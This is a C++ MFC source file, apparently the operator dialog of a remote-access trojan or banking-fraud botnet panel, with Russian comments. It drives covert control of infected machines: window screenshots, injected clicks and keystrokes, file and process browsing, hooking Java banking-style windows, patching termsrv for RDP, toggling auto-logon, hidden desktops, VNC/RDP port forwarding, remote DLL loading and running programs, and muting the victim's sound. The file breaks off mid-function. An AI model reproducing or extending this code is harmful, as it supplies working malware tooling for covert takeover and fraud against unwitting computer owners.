// ClientDlg.cpp : implementation file
//
#include "stdafx.h"
#include "Server.h"
#include "ClientDlg.h"
#include "KeysDialog.h"
#include "sendpic.h"
#include "ClOptionsDlg.h"
#include "SendToForm.h"
#include "Listener.h"
#include "ComandLine.h"
#include "FileListDlg.h"
#include "ProcessDlg.h"
#include "GatewayIPs.h"
#include "IPDialog.h"
#include "RDP_InputData.h"
#include "URLInput.h"
#include "DllLoader.h"

//
//CClientDlg dialog

IMPLEMENT_DYNAMIC(CClientDlg, CDialog)

CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CClientDlg::IDD, pParent)
	, m_pClient( 0 )
	, m_pListener( 0 )
{
	m_ClientView.parentDlg = this;
}

CClientDlg::~CClientDlg()
{
	/*CButton *chB_HookJava = (CButton *) (this->GetDlgItem(IDC_MOVE));
	if(!chB_HookJava->GetCheck())
	{
		m_pClient->RequestWinCmd( 0, PK_SC_SOUND_ON );
	}*/
	if( m_pListener &&
		m_pClient )
	{
		m_pListener->UnlockClient( m_pClient );
	}
}

void CClientDlg::Log( LPCTSTR pszFormat, ... )
{
	va_list marker;
	va_start( marker, pszFormat );

	CString s;
	s.FormatV( pszFormat, marker );
	m_LogList.SetCurSel( m_LogList.AddString( s ) );
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LOG_LIST, m_LogList);
	DDX_Control(pDX, IDC_CLIENTVIEW, m_ClientView);
	DDX_Control(pDX, IDC_STATUS, m_Status);
	DDX_Control(pDX, IDC_LIST1, m_TextWinList1);
}

LRESULT CClientDlg::OnLoadControl(WPARAM wp, LPARAM lp)
{
	SendToForm r;
	r.OnLoadControl(wp, lp);
	list<WIN_INFO> info;
	m_pClient->GetCildWindowList( info );
	r.OnInit(info);


	int iCurItems = m_TextWinList1.GetCurSel();
	r.id_CurItem = m_TextWinList1.GetItemData1(iCurItems);

	r.m_pClientTmp =m_pClient;
	int iItem=0;
	if( r.DoModal() == IDOK )
	{
		//iItem=r.iCurItems;
		//DWORD_PTR id = m_WindowList.GetItemData( iItem );
		//m_pClient->RequestLClick( id, 0, 0, false );
		//CString str=r.sRstr;
		//m_pClient->RequestNamesControl(iItem);
	}
	return 0;
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialog)
	ON_LBN_SELCHANGE(IDC_WINDOW_LIST, &CClientDlg::OnLbnSelchangeWindowList)
	ON_MESSAGE(PM_CONTROLS_SEND_COMAND,OnLoadControl)
	ON_MESSAGE(PM_CLIENT_PROGRESS,OnNetworkActivity)
	ON_MESSAGE(PM_CLIENT_WINDOW_LIST,OnWinListChanged)
	ON_MESSAGE(PM_CLIENT_FILELIST,OnFileListChanged)
	ON_MESSAGE(PM_CLIENT_GATEWAY_IPS,OnGatewayIPsChanged)
	ON_MESSAGE(PM_CLIENT_PROCESSLIST,OnProcessListChanged)
	ON_MESSAGE(PM_CLIENT_FILEGET,OnFileGet)
	ON_MESSAGE(PM_CLIENT_DRIVERLIST,OnDriverListChanged)
	ON_MESSAGE(PM_CLIENT_WINDOW_SHOT,OnWinShotReceived)
	ON_MESSAGE(PM_CLIENT_LCLICK_CONFIRMED,OnClickConfirmed)
	ON_MESSAGE(PM_CLIENT_KEYS_CONFIRMED,OnKeysConfirmed)
	ON_MESSAGE(PM_CLIENT_RUN_CONFIRMED,OnRunConfirmed)
	ON_MESSAGE(PM_CLIENT_OPTS_CONFIRMED,OnOptionsConfirmed)
	ON_MESSAGE(PM_CLIENT_CMD_CONFIRMED,OnWinCmdConfirmed)
	ON_MESSAGE(PM_CLIENT_PATCH_START,OnPatchStartConfirmed)
	ON_MESSAGE(PM_CLIENT_PATCH_TERMSRV,OnPatchTermSrv)
	ON_MESSAGE(PM_CLIENT_LCLICK,OnClientLClick)
	ON_MESSAGE(PM_CLIENT_RCLICK,OnClientRClick)

	ON_MESSAGE(PM_Client_PATCHDATA_RDP,OnClientRDP)
	ON_MESSAGE(PM_Client_PATCHDATA_VNC,OnClientVLC)

	ON_MESSAGE(PM_CLIENT_PATCH_INFO,OnPatchInfoReceived)
	ON_MESSAGE(PM_CLIENT_PATCH_INFO,OnKillProces)// замочили поток
	ON_BN_CLICKED(IDC_REFRESH_BTN, &CClientDlg::OnBnClickedRefreshBtn)
	ON_WM_SIZE()
	ON_WM_SIZING()
	ON_BN_CLICKED(IDC_REFRESHWND_BTN, &CClientDlg::OnBnClickedRefreshwndBtn)
	ON_BN_CLICKED(IDC_RUN_IE, &CClientDlg::OnBnClickedRunIe)
	ON_BN_CLICKED(IDC_PATCH_STATUS, &CClientDlg::OnBnClickedPatchStatus)
	ON_BN_CLICKED(IDC_PATCH_JAVA, &CClientDlg::OnBnClickedPatchJava)
	ON_BN_CLICKED(IDC_CMD_MIN, &CClientDlg::OnBnClickedCmdMin)
	ON_BN_CLICKED(IDC_CMD_MAX, &CClientDlg::OnBnClickedCmdMax)
	ON_BN_CLICKED(IDC_HOOK_APP, &CClientDlg::OnBnClickedHookApp)
	ON_BN_CLICKED(IDC_SET_OPTIONS, &CClientDlg::OnBnClickedSetOptions)
	ON_BN_CLICKED(IDC_BUTTON1, &CClientDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CClientDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_CHECK1, &CClientDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_CHECK2, &CClientDlg::OnBnClickedCheck2)
	ON_BN_CLICKED(IDC_BUTTON3, &CClientDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON5, &CClientDlg::OnBnClickedButton5)
	ON_BN_CLICKED(IDC_PROCDLG_BTN, &CClientDlg::OnBnClickedProcdlgBtn)
	ON_BN_CLICKED(IDC_HOOK_JAVA, &CClientDlg::OnBnClickedHookJava)
	ON_BN_CLICKED(IDC_BUTTON4, &CClientDlg::OnBnClickedButton4)
	ON_COMMAND(ID_ACCELERATOR32771, &CClientDlg::OnAccelerator_F4)
	ON_COMMAND(ID_ACCELERATOR32772, &CClientDlg::OnAccelerator32772)
	ON_COMMAND(ID_ACCELERATOR32774, &CClientDlg::OnAccelerator32774)
	ON_LBN_SELCHANGE(IDC_LIST1, &CClientDlg::OnLbnSelchangeList1)
	ON_BN_CLICKED(IDC_CMD_SHOW, &CClientDlg::OnBnClickedCmdShow)
	ON_BN_CLICKED(IDC_CMD_HIDE, &CClientDlg::OnBnClickedCmdHide)
	ON_BN_CLICKED(IDC_CMD_SHOW2, &CClientDlg::OnBnClickedCmdShow2)

	ON_COMMAND(ID_ACCELERATOR32776, &CClientDlg::OnAccelerator32776)
	ON_BN_CLICKED(IDC_CREATE_VPN_XXX, &CClientDlg::OnBnClickedCreateVpnXxx)
	ON_BN_CLICKED(IDC_OPEN_VPN_XXX, &CClientDlg::OnBnClickedOpenVpnXxx)
	ON_BN_CLICKED(IDC_CLOSE_VPN_XXX, &CClientDlg::OnBnClickedCloseVpnXxx)
	ON_BN_CLICKED(IDC_PATCH, &CClientDlg::OnBnClickedPatch)
	ON_BN_CLICKED(IDC_REBOOT, &CClientDlg::OnBnClickedReboot)
	ON_BN_CLICKED(IDC_PASS, &CClientDlg::OnBnClickedPass)
	ON_BN_CLICKED(IDC_CMD_DESK_1, &CClientDlg::OnBnClickedCmdDesk1)
	ON_BN_CLICKED(IDC_CMD_DESK_2, &CClientDlg::OnBnClickedCmdDesk2)

	ON_BN_CLICKED(IDC_AUTOLOGON_CHECK, &CClientDlg::OnBnClickedAutologonCheck)
	ON_BN_CLICKED(IDC_AUTOLOGON_ON, &CClientDlg::OnBnClickedAutologonOn)
	ON_COMMAND(ID_COMAND_MAXIMIZE, &CClientDlg::OnBnClickedCmdMax)
	ON_COMMAND(ID_COMAND_MINIMIZE, &CClientDlg::OnBnClickedCmdMin)
	ON_COMMAND(ID_COMAND_HIDE, &CClientDlg::OnBnClickedCmdHide)
	ON_COMMAND(ID_COMAND_SHOW, &CClientDlg::OnBnClickedCmdShow)
	ON_COMMAND(ID_COMAND_CLOSEWINDOW, &CClientDlg::OnBnClickedButton2)
	ON_COMMAND(ID_COMAND_REMOTEREBOOT, &CClientDlg::OnBnClickedReboot)
	ON_COMMAND(ID_COMAND_REFRESHWINDOW, &CClientDlg::OnBnClickedRefreshwndBtn)
	ON_COMMAND(ID_ACCELERATOR32812, &CClientDlg::OnBnClickedRefreshBtn)

	ON_COMMAND(ID_TOOLS_FILEEXPLORER, &CClientDlg::OnBnClickedButton3)
	ON_COMMAND(ID_TOOLS_WINDOWCOMPONENTEXPLORER, &CClientDlg::OnBnClickedButton1)
	ON_COMMAND(ID_TOOLS_PROCESSEXPLORER, &CClientDlg::OnBnClickedProcdlgBtn)
	ON_COMMAND(ID_TOOLS_PATHTEMPSRV, &CClientDlg::OnBnClickedPatch)
	ON_COMMAND(ID_TOOLS_RUNIE, &CClientDlg::OnBnClickedRunIe)
	ON_COMMAND(ID_TOOLS_AUTOLOGONCHECK, &CClientDlg::OnBnClickedAutologonCheck)
	ON_COMMAND(ID_TOOLS_AUTOLOGONON, &CClientDlg::OnBnClickedAutologonOn)
	ON_COMMAND(ID_TOOLS_AUTOLOGONOFF, &CClientDlg::OnToolsAutologonoff)

	ON_COMMAND(ID_ISFULLSCRIN_ISFULLSCRINF5, &CClientDlg::OnAccelerator32772)
	ON_COMMAND(ID_WINDOWS_FULLCLOSE, &CClientDlg::OnAccelerator32774)
	ON_COMMAND(ID_WINDOWS_SHOPSHOTF4, &CClientDlg::OnAccelerator_F4)
	ON_COMMAND(ID_WINDOWS_SNAPSHOTCURENTWINDOWF3, &CClientDlg::OnLbnSelchangeWindowList)
	ON_COMMAND(ID_ACCELERATOR32806, &CClientDlg::OnLbnSelchangeWindowList)


	ON_COMMAND(ID_OPTIONS_PROGRAM, &CClientDlg::OnBnClickedSetOptions)
	ON_COMMAND(ID_OPTIONS_DBCLICK, &CClientDlg::OnBnClickedCheck1)
	ON_COMMAND(ID_OPTIONS_AUTOUPDATE, &CClientDlg::OnBnClickedCheck2)
	ON_COMMAND(ID_OPTIONS_DELLFILE, &CClientDlg::OnBnClickedCheck3)

	ON_COMMAND(ID_JAVA_HOOK, &CClientDlg::OnBnClickedButton3)
	ON_COMMAND(ID_JAVA_HIDESHOWJAVATRAY, &CClientDlg::OnBnClickedCmdShow2)

	ON_COMMAND(ID_VPN_CREATEVPN, &CClientDlg::OnBnClickedCreateVpnXxx)
	ON_COMMAND(ID_RDP_CREATEVPNMANUALY, &CClientDlg::OnRdpCreatevpnmanualy)
	ON_COMMAND(ID_VPN_CONNECTVPN, &CClientDlg::OnBnClickedOpenVpnXxx)
	ON_COMMAND(ID_VPN_DISCONNECTVPN, &CClientDlg::OnBnClickedCloseVpnXxx)
	ON_COMMAND(ID_VPN_SETPASSWORS, &CClientDlg::OnBnClickedPass)

	ON_BN_CLICKED(IDC_CHECK3, &CClientDlg::OnBnClickedCheck3)

	ON_COMMAND(ID_JAVA_MOVEJAVA, &CClientDlg::OnJavaMovejava)
	ON_COMMAND(ID_OPTIONS_FULLLISTOFWINDOWS, &CClientDlg::OnOptionsFulllistofwindows)
	ON_COMMAND(ID_COMAND_REMOTEREBOOT2, &CClientDlg::OnComandRemotereboot2)
	ON_BN_CLICKED(IDC_SS, &CClientDlg::OnBnClickedSs)
	ON_COMMAND(ID_RDP_CONNECTIONSTATE, &CClientDlg::OnRdpConnectionstate)
	ON_BN_CLICKED(IDC_MOVE, &CClientDlg::OnBnClickedMove)
	ON_COMMAND(ID_RDP_DELETEVPN, &CClientDlg::OnRdpDeletevpn)
	ON_COMMAND(ID_OPTIONS_HIDEFROMSECONDDESC, &CClientDlg::OnOptionsHidefromseconddesc)
	ON_BN_CLICKED(IDC_DConfig, &CClientDlg::OnBnClickedDconfig)
	ON_COMMAND(ID_COMAND_CLOSE_SB, &CClientDlg::OnComandCloseSb)
	ON_COMMAND(ID_RDP_LOADDLL, &CClientDlg::OnRdpLoaddll)
	ON_COMMAND(ID_RDP_CLOSEDLL, &CClientDlg::OnRdpClosedll)
	ON_COMMAND(ID_RDP_PORTFORW, &CClientDlg::OnRdpPortforw)
	ON_COMMAND(ID_VNC_START, &CClientDlg::OnVncStart)
	ON_COMMAND(ID_VNC_STOP, &CClientDlg::OnVncStop)
//	ON_BN_CLICKED(IDC_BUTTON_Test, &CClientDlg::OnBnClickedButtonTest)
	ON_COMMAND(ID_PORTFORWARDING_VNC, &CClientDlg::OnPortforwardingVnc)
	ON_COMMAND(ID_PORTFORWARDING_RDP, &CClientDlg::OnPortforwardingRdp)
	ON_COMMAND(ID_COMAND_RUNEXE, &CClientDlg::OnComandRunexe)
	ON_WM_LBUTTONDOWN()
	END_MESSAGE_MAP()


// CClientDlg message handlers

void CClientDlg::PostNcDestroy()
{
	CDialog::PostNcDestroy();
	delete this;
}
CMenu pMenu;
void CClientDlg::OnCancel()
{
	m_pClient->SetClientNotifyWindow( 0 );
	DestroyWindow();
	pMenu.DestroyMenu();
}

void CClientDlg::OnOK()
{
}


BOOL CClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
// 0 полная версия
// 1 урезанная
#define FullVersion
#define NoHideJava
#ifdef FullVersion
	pMenu.LoadMenuW(IDR_MENU1);
#else
	pMenu.LoadMenuW(IDR_MENU2);
	CWnd* pCwnd	=	GetDlgItem(IDC_DConfig);
	pCwnd->ShowWindow(SW_HIDE);
	CWnd* pCwnd1	=	GetDlgItem(IDC_SS);
	pCwnd1->ShowWindow(SW_HIDE);

#endif
	SetMenu(&pMenu);

	hF4 = LoadAccelerators( AfxGetResourceHandle(),
	MAKEINTRESOURCE( IDR_ACCELERATOR1 ) );

	m_TextWinList1.SetItemHeight(10);
	m_TextWinList1.SetBg(RGB(50,  100, 150));
	m_TextWinList1.SetFg(RGB(255, 255,255));

	m_PlaceKeeper.Init( m_hWnd );
	m_PlaceKeeper.SetBindings( IDC_CLIENTVIEW, CRect( TA_LEFT, TA_TOP, TA_RIGHT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_LOG_LIST, CRect( TA_RIGHT, TA_BOTTOM, TA_RIGHT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_WINDOW_LIST, CRect( TA_LEFT, TA_BOTTOM, TA_RIGHT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_LIST1, CRect( TA_LEFT, TA_BOTTOM, TA_RIGHT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_REFRESH_BTN, CRect( TA_LEFT, TA_TOP, TA_LEFT, TA_TOP ) );
	m_PlaceKeeper.SetBindings( IDC_REFRESHWND_BTN, CRect( TA_LEFT, TA_BOTTOM, TA_LEFT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_PROCDLG_BTN, CRect( TA_LEFT, TA_BOTTOM, TA_LEFT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_HOOK_APP, CRect( TA_LEFT, TA_TOP, TA_LEFT, TA_TOP  ) );
	m_PlaceKeeper.SetBindings( IDC_HOOK_JAVA, CRect( TA_LEFT, TA_TOP, TA_LEFT, TA_TOP ) );
	m_PlaceKeeper.SetBindings( IDC_PATCH_STATUS, CRect( TA_LEFT, TA_TOP, TA_LEFT, TA_TOP  ) );
	m_PlaceKeeper.SetBindings( IDC_STATUS, CRect( TA_LEFT, TA_BOTTOM, TA_RIGHT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_STATIC1, CRect( TA_LEFT, TA_BOTTOM, TA_LEFT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_STATIC2, CRect( TA_RIGHT, TA_BOTTOM, TA_RIGHT, TA_BOTTOM ) );
	m_PlaceKeeper.SetBindings( IDC_CMD_DESK_1, CRect(  TA_LEFT, TA_TOP, TA_LEFT, TA_TOP  ) );
	m_PlaceKeeper.SetBindings( IDC_CMD_DESK_2, CRect(  TA_LEFT, TA_TOP, TA_LEFT, TA_TOP ) );
	m_PlaceKeeper.SetBindings( IDC_STATIC_DESK, CRect( TA_LEFT, TA_TOP, TA_LEFT, TA_TOP  ) );

	m_pClient->SetClientNotifyWindow( m_hWnd );
	m_pClient->RequestWindowList();
	m_ClientView.ClearImage();
	/*CButton *chB_HookJava = (CButton *) (this->GetDlgItem(IDC_HOOK_JAVA));
	chB_HookJava->SetCheck(1);*/
	Log( L"Getting windows..." );

#ifdef WITHOUT_VNC
	pMenu.DeleteMenu(5, MF_BYPOSITION);
	//CMenu* RDP = pMenu.GetSubMenu(5);
	//RDP->DeleteMenu(9, MF_BYPOSITION);
	//RDP->DeleteMenu(9, MF_BYPOSITION);
#endif

	return TRUE;
}
BOOL  CClientDlg::PreTranslateMessage(MSG* pMsg)
{
	if ( TranslateAccelerator( m_hWnd, hF4, pMsg ) ) return TRUE;

	return CDialog::PreTranslateMessage(pMsg);


}

HWND fileListDlg_wnd;
HWND ProcessDlg_wnd;
HWND GatewayDlg_wnd;



void CClientDlg::OnBnClickedProcdlgBtn()
{
	if(ProcessDlg_wnd != NULL && ::IsWindowVisible(ProcessDlg_wnd)) return;
	CProcessDlg* processDlg = new CProcessDlg();
	processDlg->m_pClient=m_pClient;
	processDlg->Create( CProcessDlg::IDD, 0 );
	processDlg->ShowWindow( SW_SHOW );
	processDlg->UpdateWindow( );
	ProcessDlg_wnd = processDlg->GetSafeHwnd();
	::SetWindowText(ProcessDlg_wnd, L"Processes");
}

void CClientDlg::OnBnClickedButton3()
{
	if(fileListDlg_wnd != NULL && ::IsWindowVisible(fileListDlg_wnd)) return;
	CFileListDlg* fileListDlg = new CFileListDlg();
	fileListDlg->m_pClient=m_pClient;
	fileListDlg->Create( CFileListDlg::IDD, 0 );
	fileListDlg->ShowWindow( SW_SHOW );
	fileListDlg->UpdateWindow( );
	fileListDlg_wnd = fileListDlg->GetSafeHwnd();
}

LRESULT CClientDlg::OnProcessListChanged( WPARAM wp, LPARAM lp )
{
	if(ProcessDlg_wnd == NULL || !::IsWindowVisible(ProcessDlg_wnd)) return -1;
	if(ProcessDlg_wnd!=NULL)
	{
		::PostMessage(ProcessDlg_wnd,PM_CLIENT_PROCESSLIST,wp,lp);
	}
	return 0;
}

LRESULT CClientDlg::OnFileListChanged( WPARAM wp, LPARAM lp )
{
	if(fileListDlg_wnd == NULL || !::IsWindowVisible(fileListDlg_wnd)) return -1;
	if(fileListDlg_wnd!=NULL)
	{
		::PostMessage(fileListDlg_wnd,PM_CLIENT_FILELIST,wp,lp);
	}
	return 0;
}

LRESULT CClientDlg::OnGatewayIPsChanged( WPARAM wp, LPARAM lp )
{
	if(GatewayDlg_wnd == NULL || !::IsWindowVisible(GatewayDlg_wnd)) return -1;
	if(GatewayDlg_wnd!=NULL)
	{
		::PostMessage(GatewayDlg_wnd,PM_CLIENT_GATEWAY_IPS,wp,lp);
	}
	return 0;
}

LRESULT CClientDlg::OnFileGet( WPARAM wp, LPARAM lp )
{
	if(fileListDlg_wnd == NULL || !::IsWindowVisible(fileListDlg_wnd)) return -1;
	if(fileListDlg_wnd!=NULL)
	{
		::PostMessage(fileListDlg_wnd,PM_CLIENT_FILEGET,wp,lp);
	}
	return 0;
}

LRESULT CClientDlg::OnDriverListChanged( WPARAM wp, LPARAM lp )
{
	if(fileListDlg_wnd == NULL || !::IsWindowVisible(fileListDlg_wnd)) return -1;
	if(fileListDlg_wnd!=NULL)
	{
		::PostMessage(fileListDlg_wnd,PM_CLIENT_DRIVERLIST,wp,lp);
	}
	return 0;
}

LRESULT CClientDlg::OnWinListChanged( WPARAM wp, LPARAM lp )
{
	list<WIN_INFO> info;
	m_pClient->GetWindowList( info );

	m_TextWinList1.ResetContent();
	list<WIN_INFO>::iterator I = info.begin();

	for( ; I != info.end(); I++ )
	{
		CString s1 = L"";
		if( I->placement.showCmd == SW_SHOWMAXIMIZED )
		{
			s1 = L",Maximized";
		}
		else if( I->placement.showCmd == SW_SHOWMINIMIZED )
		{
			s1 = L",Minimized";
		}
		else if( I->placement.showCmd == SW_SHOWNORMAL )
		{
			s1 = L",Normal";
		}

		CString s;
		s.Format( L"[%08X%s] - \"%s\" (%s)",
			I->id, LPCTSTR(s1), I->title, I->classname );
		#ifdef NoHideJava
		if(NULL!= wcsstr(I->classname,L"SunAwtFrame"))
			m_TextWinList1.AddItem(s,RGB(255,  0, 0), RGB(255, 255,255), I->id);
		else
		if(NULL!= wcsstr(I->classname,L"SunAwtDialog"))
			m_TextWinList1.AddItem(s,RGB(255,  0, 0), RGB(255, 255,255), I->id);
		else
		#else
			if(NULL!= wcsstr(I->classname,L"SunAwtFrame"))
			continue;
		else
			if(NULL!= wcsstr(I->classname,L"SunAwtDialog"))
			continue;
		else
		#endif
		if(NULL!= wcsstr(I->classname,L"IEFrame"))
			m_TextWinList1.AddItem(s,RGB(50,  100, 150), RGB(220, 220,220), I->id);
		else
		if(NULL!= wcsstr(I->classname,L"#"))
			m_TextWinList1.AddItem(s,RGB(0,  0, 0), RGB(245, 245,16), I->id);
		else
		if(NULL!= wcsstr(I->classname,L"Desktop"))
			m_TextWinList1.AddItem(s,RGB(0,  255, 0), RGB(0, 0,0), I->id);
		else
			m_TextWinList1.AddItem(s,RGB(255,  255, 255), RGB(0, 0,0), I->id);

	}
	m_TextWinList1.UpdateData(true);
	Log( L"Received list of windows." );
	return 0;
}

LRESULT CClientDlg::OnNetworkActivity( WPARAM wp, LPARAM lp )
{
	CString s;
	if(fileListDlg_wnd != NULL && ::IsWindowVisible(fileListDlg_wnd)) ::SendMessage(fileListDlg_wnd,PM_CLIENT_PROGRESS,wp,lp);
	s.Format( L"   Received %d of %d bytes...", wp, lp );
	m_Status.SetWindowText( s );
	return 0;
}

LRESULT CClientDlg::OnWinShotReceived( WPARAM wp, LPARAM lp )
{
	int iItem = m_TextWinList1.GetCurSel( );

	//if( iItem >= 0 )
	{
		vector<BYTE> image;
		DWORD_PTR id = 0;
		if( iItem != -1 )
			id = m_TextWinList1.GetItemData1( iItem );
		if( m_pClient->GetWinShot( id, image ))
		{
			WCHAR sName[4096] = L"";
			WCHAR sComent[4096] = L"";
			m_pClient->GetListName( sName,sComent );
			SendPic( sName, image.get_allocator().address(image.front()), image.size() );

			m_ClientView.SetImage( image );
			Log( L"Received screenshot of [%08X].", id );
		}
		else
		{
			m_ClientView.ClearImage();
			Log( L"Screenshot of [%08X] not found.", id );
		}
	}
	return 0;
}



LRESULT CClientDlg::OnPatchInfoReceived( WPARAM wp, LPARAM lp )
{
	PATCH_INFO info;
	ZeroMemory( &info, sizeof(info) );
	if( m_pClient->GetPatchInfo( &info ) )
	{
		Log( L"Patch info received." );
		CString s;
		s.Format( L"Java version: %s\nRT size: %d\nDownload progress: %d of %d",
			info.javaVersion, info.rtsize, info.downloaded_bytes, info.bytes_to_download );
		MessageBox( s );
	}
	return 0;
}

void CClientDlg::OnLbnSelchangeWindowList()
{
	CMenu* pMenu = GetMenu();
	BOOL isCheck;
	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_DELLFILE, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return;

		if (state & MF_CHECKED)
			isCheck=true;
		else
			isCheck=false;
	}


	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestWinShot( id ,isCheck);
		Log( L"Getting screenshot of [%08X]...", id );
	}
}
LRESULT CClientDlg::OnClientVLC( WPARAM wp, LPARAM lp )
{
	/*Sleep(3*1000);
	int port = m_pClient->RequestPortForw( 5900);
	if( port == 0 )
		::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
	else
	{
		WCHAR buf[100];
		wsprintf( buf, L"Открыт порт: %d", port );
		::MessageBox( 0, buf, L"Сообщение", 0 );
	}*/
	Log( L"OnClientVLC" );

	return 0;
}
LRESULT CClientDlg::OnClientRDP( WPARAM wp, LPARAM lp )
{
	/*Sleep(3*1000);
	int port = m_pClient->RequestPortForw( 3389);
	if( port == 0 )
		::MessageBox( 0, L"Не удалось выделить порт", L"Ошибка", 0 );
	else
	{
		WCHAR buf[100];
		wsprintf( buf, L"Открыт порт: %d", port );
		::MessageBox( 0, buf, L"Сообщение", 0 );
	}*/
	Log( L"OnClientRDP" );
	//OnRdpPortforw();
	return 0;
}

LRESULT CClientDlg::OnClientLClick( WPARAM wp, LPARAM lp )
{
	CMenu* pMenu = GetMenu();
	BOOL isCheck;
	if(pMenu)
	{
		UINT state = pMenu->GetMenuState(ID_OPTIONS_DBCLICK, MF_BYCOMMAND);
		if(state == 0xFFFFFFFF)
			return 0;

		if (state & MF_CHECKED)
			isCheck=true;
		else
			isCheck=false;
	}

	int iItem = m_TextWinList1.GetCurSel( );
	#ifndef FullVersion
		if( iItem == 0 ) return 0 ;
	#endif
	if( iItem >= 0 )
	{
		DWORD_PTR id = m_TextWinList1.GetItemData1( iItem );
		m_pClient->RequestLClick( id, (int)wp, (int)lp,isCheck );
		Log( L"Sending L-click (%dx%d) to [%08X]...", wp, lp, id );
	}
	return 0;
}

LRESULT CClientDlg::OnClientRClick( WPARAM wp, LPARAM lp )
{

	int iItem = m_TextWinList1.GetCurSel( );
	if( iItem >= 0 )
	{
		CKeysDialog d;
		d.m_pClientTmp =m_pClient;
		d.id= m_TextWinList1.GetItemData1( iItem );
		#ifndef FullVersion
		if (d.id==0) return 0;
		#endif
		d.iCord.x= (int)wp;
		d.iCord.y= (int)lp;
		if( d.DoModal() == IDOK )
		{
			OnLbnSelchangeWindowList();
		}
	}
	return 0;
}
LRESULT CClientDlg::OnKillProces( WPARAM wp, LPARAM lp )
{
	Log( L"OnKillProc." );
	return 0;
}

LRESULT CClientDlg::OnClickConfirmed( WPARAM wp, LPARAM lp )
{
	Log( L"L-click confirmed." );
	return 0;
}

LRESULT CClientDlg::OnKeysConfirmed( WPARAM wp, LPARAM lp )
{
	Log( L"Keystroke confirmed." );
	return 0;
}

LRESULT CClientDlg::OnRunConfirmed( WPARAM wp, LPARAM lp )
{
	Log( L"Run-request confirmed." );
	return 0;
}

LRESULT CClientDlg::OnOptionsConfirmed( WPARAM wp, LPARAM lp )
{
	if (lp!=0)
	{
		CL_OPTIONS *pCmd= (CL_OPTIONS*)(wp);

		CClOptionsDlg d;
		/*d.m_sSleep1	=pCmd->sleep1;
		d.m_sSleep2	=pCmd->sleep2;
		d.m_sSleep3	=pCmd->sleep3;*/
		d.m_Sleep	=pCmd->sleep;
		d.m_sPrio1	=pCmd->prio1;
		d.m_AutoUpdate	=m_pClient->AutoUpdate;

		lstrcpy(d.m_WinHederName,pCmd->m_WinHederName);
		lstrcpy(d.m_ProccessName,pCmd->m_ProccessName);
		lstrcpy(d.m_ClassName,pCmd->m_ClassName);

		lstrcpy(d.m_Coments, pCmd->Coments);
		lstrcpy(m_pClient->m_Coment, pCmd->Coments);
		if( d.DoModal() == IDOK )
		{
			m_pClient->RequestSetOptions(true, 10, 10, 10, 10,d.m_AutoUpdate,d.m_Sleep,d.m_Coments,d.m_WinHederName,d.m_ProccessName,d.m_ClassName );
			lstrcpy(m_pClient->m_Coment,d.m_Coments);

			::SendMessage( m_ParentHWND, PM_CLIENT_CHANGED, 0, (LPARAM)m_pClient );
			Log( L"Options has been sent..." );
		}
	}
	else
		Log( L"Options confirmed." );
	return 0;
}

LRESULT CClientDlg::OnWinCmdConfirmed( WPARAM wp, LPARAM lp )
{
	Log( L"System command confirmed." );
	return 0;
}

LRESULT CClientDlg::OnPatchStartConfirmed( WPARAM wp, LPARAM lp )
{
	Log( L"Download started." );
	return 0;
}

LRESULT CClientDlg::OnPatchTermSrv( WPARAM wp, LPARAM lp )
{
	BOOL bFlag=false;
	if (wcsstr((WCHAR*)wp,L"AutoAdminLogon"))
	{
		if (!wcsstr((WCHAR*)wp,L" is "))
		{
			if (wcsstr((WCHAR*)wp,L"Enable"))
				bFlag=true;

			CMenu* pMenu = GetMenu();

			if(pMenu)
			{
				UINT state = pMenu->GetMenuState(ID_TOOLS_AUTOLOGONON, MF_BYCOMMAND);
				if(state == 0xFFFFFFFF)
					return 0;
				pMenu->EnableMenuItem(ID_TOOLS_AUTOLOGONON,MF_BYCOMMAND );
				if (! bFlag)
				{
					pMenu->CheckMenuItem(ID_TOOLS_AUTOLOGONON, MF_UNCHECKED | MF_BYCOMMAND);
				}
				else
				{
					pMenu->CheckMenuItem(ID_TOOLS_AUTOLOGONON, MF_CHECKED | MF_BYCOMMAND);
				}

			}
		}
	}


	Log( (WCHAR*)wp );
	return 0;
}

void CClientDlg::OnBnClickedRefreshBtn()
{
	m_ClientView.ClearImage();
	m_pClient->RequestWindowList();
	Log( L"Getting windows..." );
}

void CClientDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	m_PlaceKeeper.UpdatePositions();
}

void CClientDlg::OnSizing(UINT fwSide, LPRECT pRect)
{
	//CDialog::OnSizing(fwSide, pRect);
	m_PlaceKeeper.UpdateMinRect( pRect );
}

void CClientDlg::OnBnClickedRefreshwndBtn()
{
	OnLbnSelchangeWindowList();
}

void CClientDlg::OnBnClickedRunIe()
{
	CComandLine r;
	if( r.DoModal() == IDOK )
	{
		if (MessageBoxA(0,"Off Sound","",MB_OKCANCEL)==IDOK)
		{
			CButton *chB_HookJava = (CButton *) (this->GetDlgItem(IDC_MOVE));
			if(!chB_HookJava->GetCheck())
			{
				chB_HookJava->SetCheck(true);

			}
			m_pClient->RequestWinCmd( 0, PK_SC_SOUND_OFF );

		}
